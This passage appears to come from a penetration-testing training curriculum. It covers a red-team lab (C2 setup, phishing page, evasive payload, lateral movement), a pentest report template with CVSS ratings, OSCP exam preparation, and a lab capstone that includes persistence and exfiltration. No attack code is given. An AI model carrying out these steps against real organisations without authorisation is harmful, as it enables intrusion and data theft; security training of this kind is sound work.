**Lab:**
1. Set up Sliver C2 infrastructure
2. Create phishing page with GoPhish
3. Generate evasive payload
4. Simulate initial compromise
5. Perform lateral movement
6. Write red team report

---

### **Week 12: Reporting & Certifications**

#### **Day 71-75: Professional Reporting**
```
Goal: Document findings professionally

Report Structure:

1. Executive Summary
   - High-level overview
   - Business impact
   - Key risks
   - Remediation summary

2. Methodology
   - Testing approach
   - Tools used
   - Timeline
   - Scope

3. Findings
   - Critical vulnerabilities
   - High vulnerabilities
   - Medium vulnerabilities
   - Low vulnerabilities
   - Informational

4. Technical Details
   - Step-by-step exploitation
   - Screenshots/proof
   - Affected systems
   - Root cause

5. Recommendations
   - Remediation steps
   - Priority (immediate, short-term, long-term)
   - Estimated effort

6. Appendices
   - Full scan results
   - Tool outputs
   - References

Vulnerability Rating:

# CVSS (Common Vulnerability Scoring System)
# Use CVSS calculator: cvssv3.1 or cvssv4.0

Critical (9.0-10.0):
- RCE as SYSTEM/root
- Complete system compromise
- Mass data exfiltration

High (7.0-8.9):
- Privilege escalation
- Authentication bypass
- Significant data exposure

Medium (4.0-6.9):
- Information disclosure
- DoS conditions
- Missing security headers

Low (0.1-3.9):
- Minor information leakage
- Best practice violations

Finding Template:

Title: [Vulnerability Name]
Severity: [Critical/High/Medium/Low]
CVSS: [Score] (Vector String)
Affected Systems: [List of systems]

Description:
[Clear explanation of the vulnerability]

Impact:
[What an attacker could do]

Proof of Concept:
[Step-by-step reproduction]
[Screenshots]
[Command outputs]

Remediation:
[Specific fix recommendations]

References:
[CVEs, articles, documentation]
```

**Project:** Write 3 professional vulnerability reports for findings from your lab.

---

#### **Day 76-80: Certification Preparation**
```
Goal: Prepare for OSCP or similar certification

OSCP Preparation:

# 1. PWK Course (included with exam)
# - PDF guide
# - Video modules
# - Lab environment (30/60/90 days)

# 2. Practice platforms
# - Proving Grounds Practice (OffSec)
# - HackTheBox (TJ Null's OSCP list)
# - VulnHub machines

# 3. Buffer overflow practice
# - Essential for OSCP
# - Practice on Windows XP/7 VMs
# - Immunity Debugger + Mona

# 4. Active Directory
# - Recent addition to OSCP
# - Practice AD attack paths

# 5. Report writing
# - Two reports required for OSCP
# - Practice clear documentation

Study Resources:

# Recommended boxes (TJ Null's list):
# Easy:
# - Lame, Blue, Legacy, Devel, Jerry
# - Bashed, Shocker, Nibbles, Beep

# Medium:
# - Bastard, Optimum, Granny, Grandpa
# - Arctic, Bounty, Poison, Tenten

# Hard:
# - Bastard (if not in medium), Chatterbox
# - Falafel, Hawk, Kotarak

# Books:
# - "The Hacker Playbook" series
# - "Penetration Testing" by Georgia Weidman
# - "Red Team Field Manual" (RTFM)

Exam Strategy:

# OSCP Exam (24 hours):
# - 3 standalone boxes (20, 20, 20 points)
# - 1 AD set (40 points)
# - 10 bonus points (from lab exercises + exam report)
# - Need 70 points to pass

# Time management:
# Hour 1-2: Initial scans on all boxes
# Hour 3-8: Focus on easier boxes first (get 40 points)
# Hour 9-16: AD set
# Hour 17-22: Harder boxes, privilege escalations
# Hour 23-24: Screenshot gathering, initial notes

# Next 24 hours: Report writing

# Tips:
# - Take breaks
# - Enumerate thoroughly
# - Try Harder (but know when to move on)
# - Document everything
```

**Final Project:** Complete 5 HackTheBox machines from OSCP list and write professional reports.

---

#### **Day 81-90: Capstone Project**
```
Goal: Full penetration test on complex environment

Project: Design and Compromise Multi-Tier Network

Environment Setup:
├── External
│   └── Web server (DMZ)
├── Internal Network
│   ├── File server
│   ├── Database server
│   └── Workstations
└── Active Directory Domain
    ├── Domain Controller
    ├── Member servers
    └── User workstations

Objectives:
1. External reconnaissance (Day 81)
2. Initial foothold on DMZ (Day 82-83)
3. Pivot to internal network (Day 84-85)
4. Compromise domain (Day 86-87)
5. Data exfiltration simulation (Day 88)
6. Maintain persistence (Day 88)
7. Write comprehensive report (Day 89-90)

Deliverables:
- Full penetration test report (20-30 pages)
- Attack timeline visualization
- Network diagram with compromise path
- Remediation recommendations with priorities
- Executive presentation (slides)

Evaluation Criteria:
- Methodology completeness
- Technical accuracy
- Report quality
- Remediation recommendations
- OpSec considerations
